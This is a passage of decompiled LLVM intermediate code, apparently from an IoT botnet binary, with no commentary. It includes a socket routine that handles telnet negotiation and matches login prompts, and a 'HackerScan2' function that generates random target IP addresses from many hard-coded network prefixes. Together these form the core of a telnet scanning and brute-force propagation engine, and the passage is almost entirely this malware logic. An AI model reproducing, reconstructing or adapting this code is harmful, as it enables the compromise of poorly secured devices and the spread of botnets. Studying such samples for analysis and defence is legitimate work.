  %v5_a6d0 = icmp sgt i32 %arg5, 0
  %v2_a508 = add nsw i32 %v3_a500, -152
  %v2_a50c = add i32 %v2_a508, %v13_a464
  %v1_a510 = inttoptr i32 %v2_a50c to i32*
  br label %dec_label_pc_a6a8

dec_label_pc_a4c8.lr.ph:                          ; preds = %dec_label_pc_a6bc, %dec_label_pc_a6c8
  br label %dec_label_pc_a4c8

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a4c8.lr.ph, %dec_label_pc_a4c8
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a4c8.lr.ph ], [ %v1_a4dc, %dec_label_pc_a4c8 ]
  %v5_a4d4 = mul nuw nsw i32 %storemerge27, 4
  %v6_a4d4 = add i32 %v5_a4d4, %v2_a4b4
  %v7_a4d4 = inttoptr i32 %v6_a4d4 to i32*
  store i32 0, i32* %v7_a4d4, align 4
  %v1_a4dc = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a4dc, 32
  br i1 %tmp30, label %dec_label_pc_a4c8, label %dec_label_pc_a4f0

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a4c8
  %v2_a510 = load i32, i32* %v1_a510, align 4
  %v2_a524 = or i32 %v2_a510, %v6_a520
  store i32 %v2_a524, i32* %v1_a510, align 4
  %v5_a560 = call i32 @__libc_select(i32 %v1_a544, i32 %v2_a4b4, i32 0, i32 0, i32 %v2_a54c)
  %tmp31 = icmp slt i32 %v5_a560, 1
  br i1 %tmp31, label %dec_label_pc_a6ec, label %dec_label_pc_a570

dec_label_pc_a570:                                ; preds = %dec_label_pc_a4f0
  %v2_a57c = add i32 %stack_var_-40.0, %arg6
  %v5_a580 = inttoptr i32 %v2_a57c to i8*
  %v6_a594 = inttoptr i32 %v2_a57c to i32*
  %v7_a594 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a594, i32 1, i32 0, i32 %v2_a57c)
  %v7_a5a4 = icmp eq i32 %v7_a594, -1
  br i1 %v7_a5a4, label %dec_label_pc_a5b8, label %dec_label_pc_a5ac

dec_label_pc_a5ac:                                ; preds = %dec_label_pc_a570
  %v2_a5b0 = icmp eq i32 %v7_a594, 0
  br i1 %v2_a5b0, label %dec_label_pc_a5b8, label %dec_label_pc_a5c4

dec_label_pc_a5b8:                                ; preds = %dec_label_pc_a5ac, %dec_label_pc_a570
  br label %dec_label_pc_a6f4

dec_label_pc_a5c4:                                ; preds = %dec_label_pc_a5ac
  %v2_a5cc = add i32 %v7_a594, %stack_var_-40.0
  %v2_a5d8 = load i8, i8* %v5_a580, align 1
  %v2_a5dc = icmp eq i8 %v2_a5d8, -1
  br i1 %v2_a5dc, label %dec_label_pc_a5e4, label %dec_label_pc_a664

dec_label_pc_a5e4:                                ; preds = %dec_label_pc_a5c4
  %v1_a5e8 = add i32 %v2_a57c, 1
  %v5_a5fc = inttoptr i32 %v1_a5e8 to i32*
  %v6_a5fc = call i32 @__libc_recv(i32 %arg1, i32* %v5_a5fc, i32 2, i32 0, i32 %v2_a5cc)
  %v7_a60c = icmp eq i32 %v6_a5fc, -1
  br i1 %v7_a60c, label %dec_label_pc_a620, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5e4
  %v2_a618 = icmp eq i32 %v6_a5fc, 0
  br i1 %v2_a618, label %dec_label_pc_a620, label %dec_label_pc_a62c

dec_label_pc_a620:                                ; preds = %dec_label_pc_a614, %dec_label_pc_a5e4
  br label %dec_label_pc_a6f4

dec_label_pc_a62c:                                ; preds = %dec_label_pc_a614
  %v2_a634 = add i32 %v6_a5fc, %v2_a5cc
  %v3_a648 = call i32 @negotiate(i32 %arg1, i32 %v2_a57c, i32 3)
  %v2_a650 = icmp eq i32 %v3_a648, 0
  br i1 %v2_a650, label %dec_label_pc_a658, label %dec_label_pc_a6a8

dec_label_pc_a658:                                ; preds = %dec_label_pc_a62c
  br label %dec_label_pc_a6f4

dec_label_pc_a664:                                ; preds = %dec_label_pc_a5c4
  %v7_a66c = call i32 @strstr(i32 %arg6, i8* %v6_a66c)
  %v2_a674 = icmp eq i32 %v7_a66c, 0
  br i1 %v2_a674, label %dec_label_pc_a67c, label %dec_label_pc_a6e0

dec_label_pc_a67c:                                ; preds = %dec_label_pc_a664
  br i1 %v2_a680, label %dec_label_pc_a6a8, label %dec_label_pc_a688

dec_label_pc_a688:                                ; preds = %dec_label_pc_a67c
  %v2_a68c = call i32 @matchPrompt(i8* %v1_a68c)
  %v2_a694 = icmp eq i32 %v2_a68c, 0
  br i1 %v2_a694, label %dec_label_pc_a6a8, label %dec_label_pc_a6e0

dec_label_pc_a6a8:                                ; preds = %dec_label_pc_a62c, %dec_label_pc_a688, %dec_label_pc_a67c, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a634, %dec_label_pc_a62c ], [ %v2_a5cc, %dec_label_pc_a67c ], [ %v2_a5cc, %dec_label_pc_a688 ]
  %v1_a6ac = add i32 %stack_var_-40.0, 2
  %v6_a6b8 = icmp slt i32 %v1_a6ac, %arg7
  br i1 %v6_a6b8, label %dec_label_pc_a6bc, label %dec_label_pc_a6ec

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a6a8
  %v3_a6bc = load i32, i32* %stack_var_-176, align 4
  %v5_a6c4 = icmp sgt i32 %v3_a6bc, 0
  br i1 %v5_a6c4, label %dec_label_pc_a4c8.lr.ph, label %dec_label_pc_a6c8

dec_label_pc_a6c8:                                ; preds = %dec_label_pc_a6bc
  br i1 %v5_a6d0, label %dec_label_pc_a4c8.lr.ph, label %dec_label_pc_a6ec

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a664, %dec_label_pc_a688
  br label %dec_label_pc_a6f4

dec_label_pc_a6ec:                                ; preds = %dec_label_pc_a4f0, %dec_label_pc_a6c8, %dec_label_pc_a6a8
  br label %dec_label_pc_a6f4

dec_label_pc_a6f4:                                ; preds = %dec_label_pc_a6e0, %dec_label_pc_a658, %dec_label_pc_a620, %dec_label_pc_a5b8, %dec_label_pc_a6ec
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a6ec ], [ 1, %dec_label_pc_a6e0 ], [ 0, %dec_label_pc_a5b8 ], [ 0, %dec_label_pc_a620 ], [ 0, %dec_label_pc_a658 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a5fc, { 1, 2, 0 }
  uselistorder i32 %v7_a594, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a4b4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a6f4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a6ec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a6e0, { 1, 0 }
  uselistorder label %dec_label_pc_a6a8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a4c8, { 1, 0 }
  uselistorder label %dec_label_pc_a4c8.lr.ph, { 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a708 = load i32, i32* @fp, align 4
  store i32 42768, i32* %stack_var_-4, align 4
  %v2_a70c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a70c, i32* @fp, align 4
  %v2_a710 = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* @global_var_2b5e3.69, align 1
  store i8 0, i8* @global_var_2b5e4.70, align 1
  store i8 0, i8* @global_var_2b5e5.71, align 1
  store i8 0, i8* @global_var_2b5e6.72, align 1
  %v0_a744 = call i32 @random()
  %v2_a754 = srem i32 %v0_a744, 255
  %v1_a764 = trunc i32 %v2_a754 to i8
  store i8 %v1_a764, i8* @global_var_2b5e3.69, align 1
  %v0_a768 = call i32 @random()
  %v2_a778 = srem i32 %v0_a768, 255
  %v1_a788 = trunc i32 %v2_a778 to i8
  store i8 %v1_a788, i8* @global_var_2b5e4.70, align 1
  %v0_a78c = call i32 @random()
  %v2_a79c = srem i32 %v0_a78c, 255
  %v1_a7ac = trunc i32 %v2_a79c to i8
  store i8 %v1_a7ac, i8* @global_var_2b5e5.71, align 1
  %v0_a7b0 = call i32 @random()
  %v2_a7c0 = srem i32 %v0_a7b0, 255
  %v1_a7d0 = trunc i32 %v2_a7c0 to i8
  store i8 %v1_a7d0, i8* @global_var_2b5e6.72, align 1
  %v0_a7d4 = call i32 @random()
  %v2_a7e4 = srem i32 %v0_a7d4, 208
  %v2_a7f4 = icmp eq i32 %v2_a7e4, 0
  br i1 %v2_a7f4, label %dec_label_pc_a7fc, label %dec_label_pc_a824

dec_label_pc_a7fc:                                ; preds = %entry
  %v3_a808 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a814 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a820 = sext i8 %v3_a808 to i32
  %v6_a820 = sext i8 %v3_a814 to i32
  %v8_a820 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1d258.74 to i32), i32 %v4_a820, i32 %v6_a820, i32 0)
  br label %dec_label_pc_a824

dec_label_pc_a824:                                ; preds = %entry, %dec_label_pc_a7fc
  %v7_a828 = icmp eq i32 %v2_a7e4, 1
  br i1 %v7_a828, label %dec_label_pc_a830, label %dec_label_pc_a858

dec_label_pc_a830:                                ; preds = %dec_label_pc_a824
  %v3_a83c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a848 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a854 = sext i8 %v3_a83c to i32
  %v6_a854 = sext i8 %v3_a848 to i32
  %v8_a854 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1d264.76 to i32), i32 %v4_a854, i32 %v6_a854, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a858

dec_label_pc_a858:                                ; preds = %dec_label_pc_a824, %dec_label_pc_a830
  %v7_a85c = icmp eq i32 %v2_a7e4, 2
  br i1 %v7_a85c, label %dec_label_pc_a864, label %dec_label_pc_a88c

dec_label_pc_a864:                                ; preds = %dec_label_pc_a858
  %v3_a870 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a87c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a888 = sext i8 %v3_a870 to i32
  %v6_a888 = sext i8 %v3_a87c to i32
  %v8_a888 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1d274.78 to i32), i32 %v4_a888, i32 %v6_a888, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a88c

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a858, %dec_label_pc_a864
  %v7_a890 = icmp eq i32 %v2_a7e4, 3
  br i1 %v7_a890, label %dec_label_pc_a898, label %dec_label_pc_a8c0

dec_label_pc_a898:                                ; preds = %dec_label_pc_a88c
  %v3_a8a4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a8b0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a8bc = sext i8 %v3_a8a4 to i32
  %v6_a8bc = sext i8 %v3_a8b0 to i32
  %v8_a8bc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d280.80 to i32), i32 %v4_a8bc, i32 %v6_a8bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a8c0

dec_label_pc_a8c0:                                ; preds = %dec_label_pc_a88c, %dec_label_pc_a898
  %v7_a8c4 = icmp eq i32 %v2_a7e4, 4
  br i1 %v7_a8c4, label %dec_label_pc_a8cc, label %dec_label_pc_a8f4

dec_label_pc_a8cc:                                ; preds = %dec_label_pc_a8c0
  %v3_a8d8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a8e4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a8f0 = sext i8 %v3_a8d8 to i32
  %v6_a8f0 = sext i8 %v3_a8e4 to i32
  %v8_a8f0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1d290.82 to i32), i32 %v4_a8f0, i32 %v6_a8f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a8f4

dec_label_pc_a8f4:                                ; preds = %dec_label_pc_a8c0, %dec_label_pc_a8cc
  %v7_a8f8 = icmp eq i32 %v2_a7e4, 5
  br i1 %v7_a8f8, label %dec_label_pc_a900, label %dec_label_pc_a928

dec_label_pc_a900:                                ; preds = %dec_label_pc_a8f4
  %v3_a90c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a918 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a924 = sext i8 %v3_a90c to i32
  %v6_a924 = sext i8 %v3_a918 to i32
  %v8_a924 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d29c.84 to i32), i32 %v4_a924, i32 %v6_a924, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a928

dec_label_pc_a928:                                ; preds = %dec_label_pc_a8f4, %dec_label_pc_a900
  %v7_a92c = icmp eq i32 %v2_a7e4, 6
  br i1 %v7_a92c, label %dec_label_pc_a934, label %dec_label_pc_a95c

dec_label_pc_a934:                                ; preds = %dec_label_pc_a928
  %v3_a940 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a94c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a958 = sext i8 %v3_a940 to i32
  %v6_a958 = sext i8 %v3_a94c to i32
  %v8_a958 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1d2ac.86 to i32), i32 %v4_a958, i32 %v6_a958, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a95c

dec_label_pc_a95c:                                ; preds = %dec_label_pc_a928, %dec_label_pc_a934
  %v7_a960 = icmp eq i32 %v2_a7e4, 7
  br i1 %v7_a960, label %dec_label_pc_a968, label %dec_label_pc_a990

dec_label_pc_a968:                                ; preds = %dec_label_pc_a95c
  %v3_a974 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a980 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a98c = sext i8 %v3_a974 to i32
  %v6_a98c = sext i8 %v3_a980 to i32
  %v8_a98c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d2b8.88 to i32), i32 %v4_a98c, i32 %v6_a98c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a990

dec_label_pc_a990:                                ; preds = %dec_label_pc_a95c, %dec_label_pc_a968
  %v7_a994 = icmp eq i32 %v2_a7e4, 8
  br i1 %v7_a994, label %dec_label_pc_a99c, label %dec_label_pc_a9c4

dec_label_pc_a99c:                                ; preds = %dec_label_pc_a990
  %v3_a9a8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a9b4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a9c0 = sext i8 %v3_a9a8 to i32
  %v6_a9c0 = sext i8 %v3_a9b4 to i32
  %v8_a9c0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d2c8.90 to i32), i32 %v4_a9c0, i32 %v6_a9c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9c4

dec_label_pc_a9c4:                                ; preds = %dec_label_pc_a990, %dec_label_pc_a99c
  %v7_a9c8 = icmp eq i32 %v2_a7e4, 9
  br i1 %v7_a9c8, label %dec_label_pc_a9d0, label %dec_label_pc_a9f8

dec_label_pc_a9d0:                                ; preds = %dec_label_pc_a9c4
  %v3_a9dc = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_a9e8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_a9f4 = sext i8 %v3_a9dc to i32
  %v6_a9f4 = sext i8 %v3_a9e8 to i32
  %v8_a9f4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d2d8.92 to i32), i32 %v4_a9f4, i32 %v6_a9f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9c4, %dec_label_pc_a9d0
  %v7_a9fc = icmp eq i32 %v2_a7e4, 10
  br i1 %v7_a9fc, label %dec_label_pc_aa04, label %dec_label_pc_aa2c

dec_label_pc_aa04:                                ; preds = %dec_label_pc_a9f8
  %v3_aa10 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_aa1c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_aa28 = sext i8 %v3_aa10 to i32
  %v6_aa28 = sext i8 %v3_aa1c to i32
  %v8_aa28 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1d2e8.94 to i32), i32 %v4_aa28, i32 %v6_aa28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa2c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_a9f8, %dec_label_pc_aa04
  %v7_aa30 = icmp eq i32 %v2_a7e4, 11
  br i1 %v7_aa30, label %dec_label_pc_aa38, label %dec_label_pc_aa60

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa2c
  %v3_aa44 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_aa50 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_aa5c = sext i8 %v3_aa44 to i32
  %v6_aa5c = sext i8 %v3_aa50 to i32
  %v8_aa5c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1d2f8.96 to i32), i32 %v4_aa5c, i32 %v6_aa5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa60

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa2c, %dec_label_pc_aa38
  %v7_aa64 = icmp eq i32 %v2_a7e4, 12
  br i1 %v7_aa64, label %dec_label_pc_aa6c, label %dec_label_pc_aa94

dec_label_pc_aa6c:                                ; preds = %dec_label_pc_aa60
  %v3_aa78 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_aa84 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_aa90 = sext i8 %v3_aa78 to i32
  %v6_aa90 = sext i8 %v3_aa84 to i32
  %v8_aa90 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d304.98 to i32), i32 %v4_aa90, i32 %v6_aa90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa94

dec_label_pc_aa94:                                ; preds = %dec_label_pc_aa60, %dec_label_pc_aa6c
  %v7_aa98 = icmp eq i32 %v2_a7e4, 13
  br i1 %v7_aa98, label %dec_label_pc_aaa0, label %dec_label_pc_aac8

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa94
  %v3_aaac = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_aab8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_aac4 = sext i8 %v3_aaac to i32
  %v6_aac4 = sext i8 %v3_aab8 to i32
  %v8_aac4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d314.100 to i32), i32 %v4_aac4, i32 %v6_aac4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aac8

dec_label_pc_aac8:                                ; preds = %dec_label_pc_aa94, %dec_label_pc_aaa0
  %v7_aacc = icmp eq i32 %v2_a7e4, 14
  br i1 %v7_aacc, label %dec_label_pc_aad4, label %dec_label_pc_aafc

dec_label_pc_aad4:                                ; preds = %dec_label_pc_aac8
  %v3_aae0 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_aaec = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_aaf8 = sext i8 %v3_aae0 to i32
  %v6_aaf8 = sext i8 %v3_aaec to i32
  %v8_aaf8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d324.102 to i32), i32 %v4_aaf8, i32 %v6_aaf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aafc

dec_label_pc_aafc:                                ; preds = %dec_label_pc_aac8, %dec_label_pc_aad4
  %v7_ab00 = icmp eq i32 %v2_a7e4, 15
  br i1 %v7_ab00, label %dec_label_pc_ab08, label %dec_label_pc_ab30

dec_label_pc_ab08:                                ; preds = %dec_label_pc_aafc
  %v3_ab14 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ab20 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ab2c = sext i8 %v3_ab14 to i32
  %v6_ab2c = sext i8 %v3_ab20 to i32
  %v8_ab2c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d334.104 to i32), i32 %v4_ab2c, i32 %v6_ab2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_aafc, %dec_label_pc_ab08
  %v7_ab34 = icmp eq i32 %v2_a7e4, 16
  br i1 %v7_ab34, label %dec_label_pc_ab3c, label %dec_label_pc_ab64

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_ab30
  %v3_ab48 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ab54 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ab60 = sext i8 %v3_ab48 to i32
  %v6_ab60 = sext i8 %v3_ab54 to i32
  %v8_ab60 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d344.106 to i32), i32 %v4_ab60, i32 %v6_ab60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab64

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab30, %dec_label_pc_ab3c
  %v7_ab68 = icmp eq i32 %v2_a7e4, 17
  br i1 %v7_ab68, label %dec_label_pc_ab70, label %dec_label_pc_ab98

dec_label_pc_ab70:                                ; preds = %dec_label_pc_ab64
  %v3_ab7c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ab88 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ab94 = sext i8 %v3_ab7c to i32
  %v6_ab94 = sext i8 %v3_ab88 to i32
  %v8_ab94 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d354.108 to i32), i32 %v4_ab94, i32 %v6_ab94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab98

dec_label_pc_ab98:                                ; preds = %dec_label_pc_ab64, %dec_label_pc_ab70
  %v7_ab9c = icmp eq i32 %v2_a7e4, 18
  br i1 %v7_ab9c, label %dec_label_pc_aba4, label %dec_label_pc_abcc

dec_label_pc_aba4:                                ; preds = %dec_label_pc_ab98
  %v3_abb0 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_abbc = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_abc8 = sext i8 %v3_abb0 to i32
  %v6_abc8 = sext i8 %v3_abbc to i32
  %v8_abc8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d364.110 to i32), i32 %v4_abc8, i32 %v6_abc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abcc

dec_label_pc_abcc:                                ; preds = %dec_label_pc_ab98, %dec_label_pc_aba4
  %v7_abd0 = icmp eq i32 %v2_a7e4, 19
  br i1 %v7_abd0, label %dec_label_pc_abd8, label %dec_label_pc_ac00

dec_label_pc_abd8:                                ; preds = %dec_label_pc_abcc
  %v3_abe4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_abf0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_abfc = sext i8 %v3_abe4 to i32
  %v6_abfc = sext i8 %v3_abf0 to i32
  %v8_abfc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1d374.112 to i32), i32 %v4_abfc, i32 %v6_abfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac00

dec_label_pc_ac00:                                ; preds = %dec_label_pc_abcc, %dec_label_pc_abd8
  %v7_ac04 = icmp eq i32 %v2_a7e4, 20
  br i1 %v7_ac04, label %dec_label_pc_ac0c, label %dec_label_pc_ac34

dec_label_pc_ac0c:                                ; preds = %dec_label_pc_ac00
  %v3_ac18 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ac24 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ac30 = sext i8 %v3_ac18 to i32
  %v6_ac30 = sext i8 %v3_ac24 to i32
  %v8_ac30 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1d380.114 to i32), i32 %v4_ac30, i32 %v6_ac30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac34

dec_label_pc_ac34:                                ; preds = %dec_label_pc_ac00, %dec_label_pc_ac0c
  %v7_ac38 = icmp eq i32 %v2_a7e4, 21
  br i1 %v7_ac38, label %dec_label_pc_ac40, label %dec_label_pc_ac68

dec_label_pc_ac40:                                ; preds = %dec_label_pc_ac34
  %v3_ac4c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ac58 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ac64 = sext i8 %v3_ac4c to i32
  %v6_ac64 = sext i8 %v3_ac58 to i32
  %v8_ac64 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d38c.116 to i32), i32 %v4_ac64, i32 %v6_ac64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac68

dec_label_pc_ac68:                                ; preds = %dec_label_pc_ac34, %dec_label_pc_ac40
  %v7_ac6c = icmp eq i32 %v2_a7e4, 22
  br i1 %v7_ac6c, label %dec_label_pc_ac74, label %dec_label_pc_ac9c

dec_label_pc_ac74:                                ; preds = %dec_label_pc_ac68
  %v3_ac80 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ac8c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ac98 = sext i8 %v3_ac80 to i32
  %v6_ac98 = sext i8 %v3_ac8c to i32
  %v8_ac98 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1d39c.118 to i32), i32 %v4_ac98, i32 %v6_ac98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac9c

dec_label_pc_ac9c:                                ; preds = %dec_label_pc_ac68, %dec_label_pc_ac74
  %v7_aca0 = icmp eq i32 %v2_a7e4, 23
  br i1 %v7_aca0, label %dec_label_pc_aca8, label %dec_label_pc_acd0

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac9c
  %v3_acb4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_acc0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_accc = sext i8 %v3_acb4 to i32
  %v6_accc = sext i8 %v3_acc0 to i32
  %v8_accc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1d3a8.120 to i32), i32 %v4_accc, i32 %v6_accc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_acd0

dec_label_pc_acd0:                                ; preds = %dec_label_pc_ac9c, %dec_label_pc_aca8
  %v7_acd4 = icmp eq i32 %v2_a7e4, 24
  br i1 %v7_acd4, label %dec_label_pc_acdc, label %dec_label_pc_ad04

dec_label_pc_acdc:                                ; preds = %dec_label_pc_acd0
  %v3_ace8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_acf4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ad00 = sext i8 %v3_ace8 to i32
  %v6_ad00 = sext i8 %v3_acf4 to i32
  %v8_ad00 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1d3b4.122 to i32), i32 %v4_ad00, i32 %v6_ad00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_acd0, %dec_label_pc_acdc
  %v7_ad08 = icmp eq i32 %v2_a7e4, 25
  br i1 %v7_ad08, label %dec_label_pc_ad10, label %dec_label_pc_ad38

dec_label_pc_ad10:                                ; preds = %dec_label_pc_ad04
  %v3_ad1c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ad28 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ad34 = sext i8 %v3_ad1c to i32
  %v6_ad34 = sext i8 %v3_ad28 to i32
  %v8_ad34 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1d3c0.124 to i32), i32 %v4_ad34, i32 %v6_ad34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad38

dec_label_pc_ad38:                                ; preds = %dec_label_pc_ad04, %dec_label_pc_ad10
  %v7_ad3c = icmp eq i32 %v2_a7e4, 26
  br i1 %v7_ad3c, label %dec_label_pc_ad44, label %dec_label_pc_ad6c

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad38
  %v3_ad50 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ad5c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ad68 = sext i8 %v3_ad50 to i32
  %v6_ad68 = sext i8 %v3_ad5c to i32
  %v8_ad68 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1d3cc.126 to i32), i32 %v4_ad68, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad6c

dec_label_pc_ad6c:                                ; preds = %dec_label_pc_ad38, %dec_label_pc_ad44
